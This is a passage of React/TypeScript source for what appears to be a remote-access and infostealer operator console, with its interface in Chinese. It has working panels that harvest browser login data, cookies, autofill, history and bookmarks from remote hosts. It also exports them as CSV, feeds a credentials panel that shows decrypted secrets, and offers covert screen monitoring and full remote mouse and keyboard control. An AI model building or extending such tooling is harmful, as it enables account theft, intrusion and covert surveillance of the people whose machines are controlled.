                        {!path && r.kind === 'dir' ? driveLabel(v) : v}
                      </span>
                    </Dropdown>
                  ),
                },
                { title: '大小', dataIndex: 'size', width: 110, render: (n: number, r: FsItem) => (r.kind === 'file' ? fmtSize(n) : '—') },
                { title: '修改时间', dataIndex: 'mtime', width: 170, render: (n?: number) => fmtTime(n) },
              ]}
            />
          </div>
          <div className={styles.xferDock}>
            <div className={styles.xferHead}>
              <span>传输任务{xfers.length ? ` ${xfers.length}` : ''}</span>
              <Button
                type="link"
                size="small"
                disabled={!xfers.some((j) => j.status === 'done' || j.status === 'canceled' || j.status === 'error')}
                onClick={() => {
                  void api(`/api/sessions/${id}/xfers/clear`, { method: 'POST' }).then(() => void loadXfers())
                }}
              >
                清空已完成
              </Button>
            </div>
            {xfers.length === 0 ? <div className={styles.hint}>下载或上传会出现在这里，可暂停后继续（断点续传）</div> : null}
            {xfers.map((j) => {
              const pct = j.total > 0 ? Math.min(100, Math.round((j.offset / j.total) * 100)) : j.status === 'done' ? 100 : 0
              return (
                <div key={j.id} className={styles.xferRow}>
                  <span className={styles.xferDir}>{j.dir === 'upload' ? '上传' : '下载'}</span>
                  <span className={styles.xferName} title={j.path}>
                    {j.name}
                  </span>
                  <div className={styles.xferBar}>
                    <i style={{ width: `${pct}%` }} />
                  </div>
                  <span className={styles.mono}>
                    {fmtSize(j.offset)}
                    {j.total ? ` / ${fmtSize(j.total)}` : ''} {pct}% {fmtSpeed(j.speed)}
                  </span>
                  <span className={styles.xferStatus}>{j.error || (j.status === 'running' ? '进行中' : j.status === 'paused' ? '已暂停' : j.status === 'done' ? '完成' : j.status === 'canceled' ? '已取消' : '失败')}</span>
                  <span className={styles.xferActs}>
                    {j.status === 'running' ? (
                      <Button
                        type="link"
                        size="small"
                        icon={<PauseOutlined />}
                        onClick={() => void api(`/api/sessions/${id}/xfers/${j.id}/pause`, { method: 'POST' })}
                      />
                    ) : null}
                    {j.status === 'paused' || j.status === 'error' ? (
                      <Button
                        type="link"
                        size="small"
                        icon={<CaretRightOutlined />}
                        onClick={() => {
                          void api(`/api/sessions/${id}/xfers/${j.id}/resume`, { method: 'POST' }).then((job) => {
                            const st = job as XferJob
                            const f = uploadFiles.current[j.id]
                            if (st.dir === 'upload' && f) void pumpUpload(j.id, f)
                          })
                        }}
                      />
                    ) : null}
                    {j.status === 'done' && j.dir === 'download' ? (
                      <Button
                        type="link"
                        size="small"
                        onClick={() => void downloadGet(`/api/sessions/${id}/xfers/${j.id}/file`, j.name)}
                      >
                        保存
                      </Button>
                    ) : null}
                    {j.status !== 'done' && j.status !== 'canceled' ? (
                      <Button
                        type="link"
                        size="small"
                        danger
                        icon={<CloseOutlined />}
                        onClick={() => void api(`/api/sessions/${id}/xfers/${j.id}/cancel`, { method: 'POST' })}
                      />
                    ) : null}
                  </span>
                </div>
              )
            })}
          </div>
            </div>
          </div>
        </div>
        <div className={styles.fill} hidden={mod !== 'browser'}>
          <div className={styles.browserPane}>
            <div className={styles.browserHead}>
              <Button size="small" icon={<ReloadOutlined />} loading={browserBusy} disabled={!online || deepBusy} onClick={() => void scanBrowser()}>
                扫描浏览器
              </Button>
              <Button size="small" icon={<KeyOutlined />} loading={deepBusy} disabled={!online || browserBusy} onClick={() => void scanDeep()}>
                深度收集
              </Button>
              <Input size="small" allowClear placeholder="筛选浏览器 / 配置 / 名称" value={browserQ} onChange={(e) => setBrowserQ(e.target.value)} style={{ maxWidth: 240 }} />
              <span className={styles.mono}>
                {browserRows.length
                  ? `${fileRows.length} 文件 · ${bmRows.length} 书签 · ${extRows.length} 扩展 · ${cfgRows.length} 配置`
                  : '采集浏览器配置、历史、Cookie 元数据与账号；密钥解密结果见「凭据」页'}
              </span>
              {browserSnaps.length > 0 ? (
                <Select
                  size="small"
                  style={{ width: 210 }}
                  value={browserSnapAt}
                  onChange={(v) => showSnapshot(v)}
                  options={[{ value: 0, label: '当前结果' }].concat(
                    browserSnaps.map((s) => ({ value: s.at, label: new Date(s.at * 1000).toLocaleString('zh-CN', { hour12: false }) })),
                  )}
                />
              ) : null}
            </div>
            <div className={styles.browserSection}>配置文件与数据文件</div>
            <Table
              size="small"
              rowKey="key"
              loading={dbBusy}
              pagination={{ pageSize: 50, size: 'small', hideOnSinglePage: true }}
              dataSource={fileRows}
              locale={{ emptyText: online ? '点击扫描' : '主机离线' }}
              columns={[
                { title: '浏览器', dataIndex: 'browser', width: 110, sorter: (x: BrowserRow, y: BrowserRow) => x.browser.localeCompare(y.browser) },
                { title: '配置文件', dataIndex: 'a', width: 130 },
                { title: '项目', dataIndex: 'b', ellipsis: true },
                { title: '大小', dataIndex: 'size', width: 100, sorter: (x: BrowserRow, y: BrowserRow) => x.size - y.size, render: (v: number) => (v ? fmtSize(v) : '—') },
                { title: '最后修改', dataIndex: 'c', width: 170, sorter: (x: BrowserRow, y: BrowserRow) => Number(x.c) - Number(y.c), render: (v: string) => fmtTime(Number(v)) },
                {
                  title: '操作',
                  width: 260,
                  render: (_: unknown, r: BrowserRow) => {
                    if (r.b === 'History') {
                      return (
                        <span>
                          {storeBtn(r, 'history', '浏览历史')}
                          {storeBtn(r, 'downloads', '下载记录')}
                        </span>
                      )
                    }
                    if (r.b === 'Web Data') return storeBtn(r, 'autofill', '自动填充')
                    if (r.b === 'Login Data') return storeBtn(r, 'logins', '账号列表')
                    if (r.b === 'Cookies') return storeBtn(r, 'cookies', 'Cookie 元数据')
                    if (r.b === 'places.sqlite') {
                      return (
                        <span>
                          {storeBtn(r, 'history', '历史')}
                          {storeBtn(r, 'bookmarks', '书签')}
                          {storeBtn(r, 'formhistory', '表单历史')}
                        </span>
                      )
                    }
                    return null
                  },
                },
              ]}
            />
            <div className={styles.browserSection}>书签</div>
            <Table
              size="small"
              rowKey="key"
              pagination={{ pageSize: 50, size: 'small', hideOnSinglePage: true }}
              dataSource={bmRows}
              locale={{ emptyText: '无' }}
              columns={[
                { title: '浏览器', dataIndex: 'browser', width: 110 },
                { title: '配置文件', dataIndex: 'a', width: 130 },
                { title: '名称', dataIndex: 'b', width: 240, ellipsis: true },
                { title: 'URL', dataIndex: 'c', ellipsis: true, render: (v: string) => (v ? <a href={v} target="_blank" rel="noreferrer">{v}</a> : '—') },
              ]}
            />
            <div className={styles.browserSection}>扩展</div>
            <Table
              size="small"
              rowKey="key"
              pagination={{ pageSize: 50, size: 'small', hideOnSinglePage: true }}
              dataSource={extRows}
              locale={{ emptyText: '无' }}
              columns={[
                { title: '浏览器', dataIndex: 'browser', width: 110 },
                { title: '配置文件', dataIndex: 'a', width: 130 },
                { title: '名称', dataIndex: 'b', ellipsis: true },
                { title: '版本', dataIndex: 'c', width: 120 },
              ]}
            />
            <div className={styles.browserSection}>配置摘要</div>
            <Table
              size="small"
              rowKey="key"
              pagination={{ pageSize: 50, size: 'small', hideOnSinglePage: true }}
              dataSource={cfgRows}
              locale={{ emptyText: '无' }}
              columns={[
                { title: '浏览器', dataIndex: 'browser', width: 110 },
                { title: '配置文件', dataIndex: 'a', width: 130 },
                { title: '项目', dataIndex: 'b', width: 280, ellipsis: true },
                { title: '值', dataIndex: 'c', ellipsis: true, render: (v: string) => v || '—' },
              ]}
            />
            {dbKind ? (
              <>
                <div className={styles.browserSection}>
                  {dbTitle(dbKind)}
                  <Button type="link" size="small" onClick={() => saveCsv(`${dbKind}-${info?.hostname || 'host'}.csv`, dbCols, dbRows)}>
                    导出 CSV
                  </Button>
                  <Button
                    type="link"
                    size="small"
                    onClick={() => {
                      setDbKind('')
                      setDbCols([])
                      setDbRows([])
                    }}
                  >
                    关闭
                  </Button>
                </div>
                <Table
                  size="small"
                  rowKey="key"
                  loading={dbBusy}
                  pagination={{ pageSize: 50, size: 'small', hideOnSinglePage: true }}
                  dataSource={dbRows.map((r, i) => ({ key: `${i}`, cells: r }))}
                  columns={dbCols.map((col, ci) => ({ title: col, dataIndex: ['cells', ci], ellipsis: true }))}
                />
              </>
            ) : null}
          </div>
        </div>
        <div className={styles.fill} hidden={mod !== 'creds'}>
          {mod === 'creds' && id ? (
            <CredsPanel sid={id} host={info?.hostname || ''} online={online} />
          ) : null}
        </div>
        <div className={styles.fill} hidden={mod !== 'desk'}>
          <div className={styles.fsSplit} style={{ gridTemplateColumns: `${sideW}px 6px minmax(0, 1fr)` }}>
            <aside className={styles.fsSide}>
              <div className={styles.fsSideHead}>
                <Checkbox
                  checked={savedShots.length > 0 && shotSel.length === savedShots.length}
                  indeterminate={shotSel.length > 0 && shotSel.length < savedShots.length}
                  disabled={!savedShots.length}
                  onChange={(e) => setShotSel(e.target.checked ? savedShots.map((s) => s.id) : [])}
                />
                截屏
                <span className={styles.stashBatch}>
                  <Button
                    type="link"
                    size="small"
                    className={styles.sideLink}
                    disabled={!shotSel.length}
                    onClick={() => {
                      const tok = getToken()
                      void Promise.all(
                        shotSel.map(async (fid) => {
                          const rec = savedShots.find((s) => s.id === fid)
                          const res = await fetch(`/api/sessions/${id}/shots/${fid}`, {
                            headers: tok ? { Authorization: `Bearer ${tok}` } : {},
                          })
                          if (!res.ok) throw new Error('下载失败')
                          const blob = await res.blob()
                          const a = document.createElement('a')
                          a.href = URL.createObjectURL(blob)
                          a.download = `${rec?.remark || 'screen'}-${fid}.jpg`
                          a.click()
                        }),
                      ).then(
                        () => message.success('已下载'),
                        (e) => message.error(e instanceof Error ? e.message : '下载失败'),
                      )
                    }}
                  >
                    批量下载
                  </Button>
                  <Popconfirm
                    title={`删除选中 ${shotSel.length} 项？`}
                    onConfirm={() => {
                      void Promise.all(shotSel.map((fid) => api(`/api/sessions/${id}/shots/${fid}`, { method: 'DELETE' }))).then(
                        () => {
                          setShotSel([])
                          void loadShots()
                        },
                        (e) => message.error(e instanceof Error ? e.message : '删除失败'),
                      )
                    }}
                  >
                    <Button type="link" size="small" danger className={styles.sideLink} disabled={!shotSel.length}>
                      批量删除
                    </Button>
                  </Popconfirm>
                </span>
              </div>
              <div className={styles.stashList}>
                {savedShots.length === 0 ? <div className={styles.hint}>监控或控制时点截屏，记录会留在这里</div> : null}
                {savedShots.map((s) => (
                  <div key={s.id} className={styles.shotCard}>
                    <Checkbox
                      checked={shotSel.includes(s.id)}
                      onChange={(e) => {
                        const on = e.target.checked
                        setShotSel((prev) => (on ? [...prev, s.id] : prev.filter((k) => k !== s.id)))
                      }}
                    />
                    <div className={styles.shotBody}>
                      <Input
                        size="small"
                        className={styles.shotRemark}
                        placeholder="备注"
                        defaultValue={s.remark}
                        onBlur={(e) => {
                          const remark = e.target.value
                          if (remark === s.remark) return
                          void api(`/api/sessions/${id}/shots/${s.id}`, { method: 'PATCH', body: JSON.stringify({ remark }) })
                        }}
                      />
                      <button type="button" className={styles.shotThumb} onClick={() => setViewShot(s)}>
                        <img src={s.url} alt="" />
                      </button>
                    </div>
                  </div>
                ))}
              </div>
            </aside>
            <div
              className={styles.fsResizer}
              onMouseDown={(e) => {
                e.preventDefault()
                const startX = e.clientX
                const startW = sideW
                const move = (ev: MouseEvent) => setSideW(Math.min(420, Math.max(180, startW + ev.clientX - startX)))
                const up = () => {
                  window.removeEventListener('mousemove', move)
                  window.removeEventListener('mouseup', up)
                }
                window.addEventListener('mousemove', move)
                window.addEventListener('mouseup', up)
              }}
            />
            <div className={styles.fsMain}>
          <div className={styles.fsBar}>
            <Select
              size="small"
              style={{ width: 120 }}
              value={deskMode}
              disabled={deskOn}
              onChange={(v) => setDeskMode(v)}
              options={[
                { value: 'watch', label: '屏幕监控' },
                { value: 'control', label: '远程控制' },
              ]}
            />
            <Button type={deskOn ? 'default' : 'primary'} size="small" onClick={() => void toggleDesk()} disabled={!online}>
              {deskOn ? '停止' : deskMode === 'control' ? '开始控制' : '开始监控'}
            </Button>
            <Button size="small" icon={<CameraOutlined />} loading={pending} disabled={!online} onClick={() => void grab()}>
              截屏
            </Button>
            <Select
              size="small"
              style={{ width: 130 }}
              value={deskWidth}
              onChange={(v) => {
                setDeskWidth(v)
                if (deskOn && id) {
                  void api(`/api/sessions/${id}/desktop`, { method: 'POST', body: JSON.stringify({ action: 'start', width: v, quality: deskQuality }) })
                }
              }}
              options={[
                { value: 0, label: '原始 100%' },
                { value: 75, label: '高 75%' },
                { value: 50, label: '中 50%' },
                { value: 35, label: '低 35%' },
              ]}
            />
            <Select
              size="small"
              style={{ width: 110 }}
              value={deskQuality}
              onChange={(v) => {
                setDeskQuality(v)
                if (deskOn && id) {
                  void api(`/api/sessions/${id}/desktop`, { method: 'POST', body: JSON.stringify({ action: 'start', width: deskWidth, quality: v }) })
                }
              }}
              options={[
                { value: 40, label: '画质 低' },
                { value: 70, label: '画质 中' },
                { value: 95, label: '画质 高' },
              ]}
            />
            {screenWH.w ? (
              <span className={styles.mono}>
                采集 {screenWH.w}×{screenWH.h}
              </span>
            ) : null}
            <span className={styles.hint}>{deskMode === 'control' ? '在画面内拖动即可操作远程鼠标' : '仅查看画面，可截屏'}</span>
            <Button
              size="small"
              onClick={() => {
                const el = deskBox.current
                if (!el) return
                if (document.fullscreenElement) void document.exitFullscreen()
                else void el.requestFullscreen()
              }}
            >
              全屏
            </Button>
          </div>
          <div
            ref={deskBox}
            className={styles.desk}
            tabIndex={0}
            onKeyDown={(e) => {
              if (!deskOn || deskMode !== 'control') return
              e.preventDefault()
              void sendInput(4, 0, 0, e.keyCode, true)
            }}
            onKeyUp={(e) => {
              if (!deskOn || deskMode !== 'control') return
              e.preventDefault()
              void sendInput(4, 0, 0, e.keyCode, false)
            }}
          >
            {desk ? (
              <img
                src={desk}
                alt="远程桌面"
                draggable={false}
                onPointerDown={(e) => {
                  if (!deskOn || deskMode !== 'control') return
                  e.preventDefault()
                  e.currentTarget.setPointerCapture(e.pointerId)
                  const { x, y } = absXY(e)
                  const btn = e.button === 2 ? 2 : e.button === 1 ? 4 : 1
                  void sendInput(2, x, y, btn, true)
                }}
                onPointerMove={(e) => {
                  if (!deskOn || deskMode !== 'control') return
                  const now = Date.now()
                  if (now - lastMove.current < 8) return
                  lastMove.current = now
                  const { x, y } = absXY(e)
                  void sendInput(1, x, y, 0, false)
                }}
                onPointerUp={(e) => {
                  if (!deskOn || deskMode !== 'control') return
                  const { x, y } = absXY(e)
                  const btn = e.button === 2 ? 2 : e.button === 1 ? 4 : 1
                  void sendInput(2, x, y, btn, false)
                }}
                onWheel={(e) => {
                  if (!deskOn || deskMode !== 'control') return
                  e.preventDefault()
                  const delta = e.deltaY > 0 ? -120 : 120
                  void sendInput(3, 0, 0, delta, false)
                }}
                onContextMenu={(e) => e.preventDefault()}
              />
            ) : (
              <span className={styles.hint}>开始监控或控制后显示画面</span>
            )}
          </div>
            </div>
          </div>
        </div>
      </div>
      <Modal
        title="新建目录"
        open={mkOpen}
        onCancel={() => setMkOpen(false)}
        onOk={() => void mkdir()}
        okText="确定"
        cancelText="取消"
        okButtonProps={{ disabled: !newDir.trim() }}
      >
        <Input
          autoFocus
          placeholder="目录名"
          value={newDir}
          onChange={(e) => setNewDir(e.target.value)}
          onPressEnter={() => void mkdir()}
        />
      </Modal>
      <Modal
        title="重命名"
        open={!!renFrom}
        onCancel={() => setRenFrom('')}
        onOk={() => void renameFile()}
        okText="确定"
        cancelText="取消"
      >
        <Input value={renTo} onChange={(e) => setRenTo(e.target.value)} onPressEnter={() => void renameFile()} />
      </Modal>
      <Modal title={viewShot?.remark || '截屏'} open={!!viewShot} footer={null} onCancel={() => setViewShot(null)} width={900}>
        {viewShot ? <img src={viewShot.url} alt="" style={{ width: '100%' }} /> : null}
      </Modal>
    </div>
  )
}
